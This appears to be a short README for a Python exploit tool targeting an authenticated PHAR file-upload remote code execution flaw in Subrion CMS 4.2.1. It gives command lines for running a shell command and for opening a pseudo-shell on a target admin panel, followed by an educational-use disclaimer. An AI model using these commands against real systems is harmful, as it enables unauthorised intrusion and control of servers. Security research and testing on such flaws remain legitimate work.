# Subrion 4.2.1 PHAR File Upload

A python3 script for Subrion 4.2.1 PHAR File Upload Authenticated Remote Code Execution (RCE)

## Getting Started

### Executing program

* RCE
```
python3 subrion_4.2.1.py -t http://subrionrce.com/subrion/panel/ -u admin -p password -rce whoami
```
* Pseudo-shell
```
python3 subrion_4.2.1.py -t http://subrionrce.com/subrion/panel/ -u admin -p password -shell
```

## Help

For help menu:
```
python3 subrion_4.2.1.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.